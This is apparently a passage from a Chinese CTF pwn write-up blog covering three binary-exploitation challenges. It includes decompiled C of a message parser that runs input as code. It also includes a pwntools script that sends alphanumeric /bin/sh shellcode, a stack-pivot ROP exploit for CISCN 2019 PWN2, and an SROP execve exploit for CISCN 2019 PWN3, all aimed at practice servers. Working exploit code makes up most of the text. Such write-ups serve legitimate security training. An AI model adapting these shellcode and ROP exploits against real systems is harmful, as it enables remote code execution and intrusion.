<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_FFD</span><span class="hljs-params">(_BYTE *a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> *sa; <span class="hljs-comment">// [rsp+8h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> *sb; <span class="hljs-comment">// [rsp+8h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> *sc; <span class="hljs-comment">// [rsp+8h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> *sd; <span class="hljs-comment">// [rsp+8h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [rsp+17h] [rbp-39h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+1Ch] [rbp-34h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+2Ch] [rbp-24h]</span><br>  <span class="hljs-type">void</span> *dest; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br>  <span class="hljs-type">char</span> *s1; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> *nptr; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v13; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  v13 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(qword_202040, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(qword_202040));<br>  v8 = <span class="hljs-number">0</span>;<br>  v7 = <span class="hljs-number">0</span>;<br>  dest = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( !*a1 || *a1 != <span class="hljs-number">10</span> &amp;&amp; (*a1 != <span class="hljs-number">13</span> || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">10</span>) )<span class="hljs-comment">// 关于a[0]和a[1]的判定关系</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v8 &lt;= <span class="hljs-number">5</span> )<br>      qword_202040[<span class="hljs-number">2</span> * v8] = a1;                <span class="hljs-comment">// 处理的位分别是0，8，16，24，32</span><br>    sb = <span class="hljs-built_in">strchr</span>(a1, <span class="hljs-number">58</span>);                        <span class="hljs-comment">// 找到字符&#x27;:&#x27;位置</span><br>    <span class="hljs-keyword">if</span> ( !sb )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    *sb = <span class="hljs-number">0</span>;                                    <span class="hljs-comment">// 将找到&#x27;:&#x27;的位置数值变为0</span><br>    <span class="hljs-keyword">for</span> ( sc = sb + <span class="hljs-number">1</span>; *sc &amp;&amp; (*sc == <span class="hljs-string">&#x27; &#x27;</span> || *sc == <span class="hljs-string">&#x27;\r&#x27;</span> || *sc == <span class="hljs-string">&#x27;\n&#x27;</span> || *sc == <span class="hljs-string">&#x27;\t&#x27;</span>); ++sc )<span class="hljs-comment">// sc=sb的下一位，sc满足在范围内且等于指定字符</span><br>      *sc = <span class="hljs-number">0</span>;                                  <span class="hljs-comment">// 当前字符置0</span><br>    <span class="hljs-keyword">if</span> ( !*sc )             <br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;abort.&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v8 &lt;= <span class="hljs-number">5</span> )<br>      qword_202040[<span class="hljs-number">2</span> * v8 + <span class="hljs-number">1</span>] = sc;            <span class="hljs-comment">// (0,8,16,24,32)+1出来的值</span><br>    sd = <span class="hljs-built_in">strchr</span>(sc, <span class="hljs-string">&#x27;\n&#x27;</span>);                <br>    <span class="hljs-keyword">if</span> ( !sd )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);<br>    &#125;<br>    *sd = <span class="hljs-number">0</span>;                                    <span class="hljs-comment">// 置零</span><br>    a1 = sd + <span class="hljs-number">1</span>;                                <span class="hljs-comment">// 首位置到sd的下一位</span><br>    <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">&#x27;\r&#x27;</span> )                          <span class="hljs-comment">// 如果当前位是\r下一位置0</span><br>      *a1++ = <span class="hljs-number">0</span>;<br>    s1 = (<span class="hljs-type">char</span> *)qword_202040[<span class="hljs-number">2</span> * v8];          <span class="hljs-comment">// 0,8,16,24,32</span><br>    nptr = (<span class="hljs-type">char</span> *)qword_202040[<span class="hljs-number">2</span> * v8 + <span class="hljs-number">1</span>];  <br>    <span class="hljs-keyword">if</span> ( !strcasecmp(s1, <span class="hljs-string">&quot;opt&quot;</span>) )         <br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v7 )<br>      &#123;                                         <span class="hljs-comment">// 第一次opt退出</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);<br>      &#125;<br>      v7 = atoi(nptr);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( strcasecmp(s1, <span class="hljs-string">&quot;msg&quot;</span>) )              <span class="hljs-comment">// 是否是msg</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(nptr) &lt;= <span class="hljs-number">1</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);<br>      &#125;<br>      v9 = <span class="hljs-built_in">strlen</span>(nptr) - <span class="hljs-number">1</span>;             <br>      <span class="hljs-keyword">if</span> ( dest )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);<br>      &#125;<br>      dest = <span class="hljs-built_in">calloc</span>(v9 + <span class="hljs-number">8</span>, <span class="hljs-number">1uLL</span>);<br>      <span class="hljs-keyword">if</span> ( v9 &lt;= <span class="hljs-number">0</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);<br>      &#125;<br>      <span class="hljs-built_in">memcpy</span>(dest, nptr, v9);                 <br>    &#125;<br>    ++v8;<br>  &#125;<br>  *a1 = <span class="hljs-number">0</span>;<br>  sa = a1 + <span class="hljs-number">1</span>;                              <br>  <span class="hljs-keyword">if</span> ( *sa == <span class="hljs-string">&#x27;\n&#x27;</span> )                            <span class="hljs-comment">// 如果是换行符就赋值0</span><br>    *sa = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">switch</span> ( v7 )                           <br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      sub_DA8((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      sub_EFE((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      sub_CBD((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">6</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v13;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>由上述可知，要进行两次校验，在连接之后就需要先写通过校验才可以进行后续操作，即 <code>&#39;opt:1\r\nmsg:ro0t\r\n</code> 和 <code>opt:2\r\nmsg:</code>，且最终结尾必须是 <code>\r\n</code></p>
<p>绕过后到达 sub_DA8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_DA8</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-2Ch]</span><br>  <span class="hljs-type">void</span> *dest; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(a1); ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="hljs-number">10</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;oh!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( unk_202028 != <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;oh!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( unk_202024 )<br>  &#123;<br>    v1 = getpagesize();<br>    dest = (<span class="hljs-type">void</span> *)(<span class="hljs-type">int</span>)mmap((<span class="hljs-type">char</span> *)&amp;loc_FFE + <span class="hljs-number">2</span>, v1, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>    v2 = <span class="hljs-built_in">strlen</span>(a1);<br>    <span class="hljs-built_in">memcpy</span>(dest, a1, v2);<br>    ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))dest)();    <span class="hljs-comment">//shellcode利用转换执行</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(a1);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push edx<br>push 0x36363630<br>push esp<br>pop ecx<br>xor dword ptr ds:[ecx],esi<br>xor esi,dword ptr ds:[ecx]<br>pop eax<br>push 0x33333333<br>xor dword ptr ds:[ecx],esi<br>imul esi,dword ptr ds:[ecx],0x33<br>pop eax<br>push 0x69<br>push esi<br>xor dword ptr ds:[ecx],esi<br>dec eax<br>arpl word ptr ds:[ecx],si<br>pop edx<br>pop eax<br>pop ecx<br>xor word ptr ds:[ecx+esi*2+0x49],dx<br>dec eax<br>cmp word ptr ds:[ebx+0x44],bp<br>jno short tested.004780A6<br>xor byte ptr ds:[edx],dh<br>inc esp<br>jno short tested.004780AC<br>xor byte ptr ds:[ecx+esi+0x48],al<br>jnz short tested.0047808D<br>dec ebp<br>xor al,byte ptr ds:[edi+0x30]<br>pop edx<br>xor ch,byte ptr ds:[edi+0x34]<br>dec eax<br>xor byte ptr ss:[ebp+0x30],dh<br>push eax<br>xor dword ptr ds:[esi],esi<br>xor byte ptr ds:[edx+0x30],bl<br>aaa<br>dec edi<br>xor byte ptr ds:[edx+0x30],bl<br>inc ebx<br>xor dword ptr ds:[eax],esi<br>xor byte ptr ds:[ecx+0x35],bh<br>dec edi<br>xor eax,dword ptr ds:[edi+0x30]<br>xor dh,byte ptr ds:[eax]<br>inc edx<br>xor ch,byte ptr ds:[esi+0x30]<br>xor byte ptr ss:[esi+0x34],cl<br>jno short tested.004780B8<br>outs dx,byte ptr es:[edi]<br>xor dh,byte ptr ds:[eax+esi+0x42]<br>xor byte ptr ds:[eax],dh<br>xor byte ptr ds:[ecx],dh<br>xor byte ptr ds:[ecx],dh<br>xor byte ptr ds:[eax+0x33],cl<br>push ebx<br>xor bh,byte ptr ds:[ecx+0x30]<br>pop ecx<br>xor byte ptr ds:[edi+0x30],cl<br>outs dx,byte ptr es:[edi]<br>xor byte ptr ds:[edx+0x30],bh<br>xor dword ptr ds:[ebx],esi<br>xor al,0x30<br>xor al,byte ptr fs:[esi+0x34]<br>jns short tested.004780E4<br>push eax<br>xor dword ptr ds:[ecx],esi<br>xor eax,0x306E316C<br>dec edx<br>xor byte ptr ds:[eax+0x30],ch<br>popad<br>xor byte ptr ds:[edi],dh<br>xor byte ptr ds:[eax+eax],dh<br>add bh,bh<br>add byte ptr ds:[eax],al<br>add bh,bh<br><br>pop eax<br>inc ecx<br></code></pre></td></tr></table></figure>

<p>shellcode:&#x2F;bin&#x2F;sh</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io = remote(ip,port)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;opt:1\r\nmsg:ro0t\r\n&#x27;</span>)    <span class="hljs-comment">##绕过1</span><br>shellcode = <span class="hljs-string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;opt:2\r\nmsg:&#x27;</span>+shellcode+<span class="hljs-string">&#x27;\r\n&#x27;</span>)    <span class="hljs-comment">#poc</span><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="CISCN-2019-东南-PWN2"><a href="#CISCN-2019-东南-PWN2" class="headerlink" title="[CISCN 2019 东南]PWN2"></a>[CISCN 2019 东南]PWN2</h3><h4 id="题目说明-14"><a href="#题目说明-14" class="headerlink" title="题目说明"></a>题目说明</h4><p>栈迁移</p>
<h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><p class='item-img' data-src='/2024/03/15/MyS3andB0x/Xrd5bbrsFoknfYxrjUWcuNUXnhe.png'><img src="/2024/03/15/MyS3andB0x/Xrd5bbrsFoknfYxrjUWcuNUXnhe.png"></p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/SvTebfEzroYersx6WT1cW3PsnOc.png'><img src="/2024/03/15/MyS3andB0x/SvTebfEzroYersx6WT1cW3PsnOc.png"></p>
<p>read 读 0x30，但 s 已经 0x28，长度不够，考虑栈迁移。找一下 gadget</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/AzL1bhr7cod9jjxarg0cmQ3enHb.png'><img src="/2024/03/15/MyS3andB0x/AzL1bhr7cod9jjxarg0cmQ3enHb.png"></p>
<p>接下来我们尝试把&#x2F;bin&#x2F;sh 写入 s，找一下 s 的地址</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/MpTNbEW9co3pUZxddzfcHrr7nRg.png'><img src="/2024/03/15/MyS3andB0x/MpTNbEW9co3pUZxddzfcHrr7nRg.png"></p>
<p>在 vul 函数上输点奇怪的东西，然后找一下他</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Xn1Ab9yYToJpMTxkaMUc4Subnqd.png'><img src="/2024/03/15/MyS3andB0x/Xn1Ab9yYToJpMTxkaMUc4Subnqd.png"></p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/XcyebEK6RoT7ARxO9bGc8bD4nIf.png'><img src="/2024/03/15/MyS3andB0x/XcyebEK6RoT7ARxO9bGc8bD4nIf.png"></p>
<p>ebp 就变成奇怪的形状了（大雾），算一下 ebp 的偏移</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/VuhLbwpLcopSfdxzKaKcbyh2nzc.png'><img src="/2024/03/15/MyS3andB0x/VuhLbwpLcopSfdxzKaKcbyh2nzc.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">Padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x27</span> + <span class="hljs-string">b&#x27;C&#x27;</span><br>io.send(Padding)<br>io.recvuntil(<span class="hljs-string">b&#x27;C&#x27;</span>)<br>EBP = u32(io.recv(<span class="hljs-number">4</span>))<br>s = EBP - <span class="hljs-number">0x38</span><br></code></pre></td></tr></table></figure>

<p>首先是接收 EBP 地址的 Payload。</p>
<p>Printf 会在字符串结尾加上一个’\x00’。我们手动填满 buf 即可让 printf 打印出 EBP 的地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload = (<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x04</span>) + p32(system) + p32(vul) + p32(s + <span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>Payload = Payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>Payload += p32(s) + p32(leave_ret)<br></code></pre></td></tr></table></figure>

<p>(b’A’ * 0x04) 栈对齐</p>
<p>system 调用 system 函数</p>
<p>vul 返回地址，随便填 防止程序崩溃</p>
<p>s + 0x10 为什么是 0x10，32 位中地址长度是 0x04，而此处 Payload 从第一个开始算到第四个,4x4 &#x3D; 16 &#x3D; 0x10。</p>
<p>b’&#x2F;bin&#x2F;sh’ 将 &#x2F;bin&#x2F;sh 字符串送入栈中</p>
<p>ljust 在 payload 的末尾填充空字节，填充的大小为 0x28-len(Payload)</p>
<p>s 指向本段 ROP 链的地址，覆盖了 ebp</p>
<p>leave_ret 将 eip 覆盖为 ebp，也就是刚才的 s，执行 ROP 链</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br> <br>io = remote(<span class="hljs-string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28243</span>)<br><span class="hljs-comment">#io = process(&#x27;./CISCN_2019_PWN2&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn2&#x27;</span>)<br> <br>Padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x27</span> + <span class="hljs-string">b&#x27;C&#x27;</span><br>system = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>vul = elf.sym[<span class="hljs-string">&#x27;vul&#x27;</span>]<br>leave_ret = <span class="hljs-number">0x80484b8</span><br> <br>io.send(Padding)<br>io.recvuntil(<span class="hljs-string">b&#x27;C&#x27;</span>)<br>EBP = u32(io.recv(<span class="hljs-number">4</span>))<br>s = EBP - <span class="hljs-number">0x38</span><br> <br>Payload = (<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x04</span>) + p32(system) + p32(vul) + p32(s + <span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>Payload = Payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>Payload += p32(s) + p32(leave_ret)<br> <br>io.sendline(Payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="CISCN-2019-华南-PWN3"><a href="#CISCN-2019-华南-PWN3" class="headerlink" title="[CISCN 2019 华南]PWN3"></a>[CISCN 2019 华南]PWN3</h3><h4 id="题目说明-15"><a href="#题目说明-15" class="headerlink" title="题目说明"></a>题目说明</h4><p>srop 不会，贴个 exp 先</p>
<h4 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># io = process(&quot;./hnpwn3&quot;)</span><br>io = remote(<span class="hljs-string">&quot;node1.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28434</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hnpwn3&quot;</span>)<br><br>syscall = <span class="hljs-number">0x400517</span><br>gadget = <span class="hljs-number">0x4004DA</span><br>vuln = <span class="hljs-number">0x4004ED</span><br><br><span class="hljs-comment"># gdb.attach(io,&quot;b *main&quot;)</span><br><br>io.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x10</span>+p64(vuln))<br>io.recv(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment"># print()</span><br>stack = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x118</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(stack))<br><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">59</span><br>frame.rdi = stack<br>frame.rip = syscall<br>frame.rsi = <span class="hljs-number">0</span><br><br>payload = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">0x2</span> + p64(gadget) + p64(syscall) + <span class="hljs-built_in">bytes</span>(frame)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

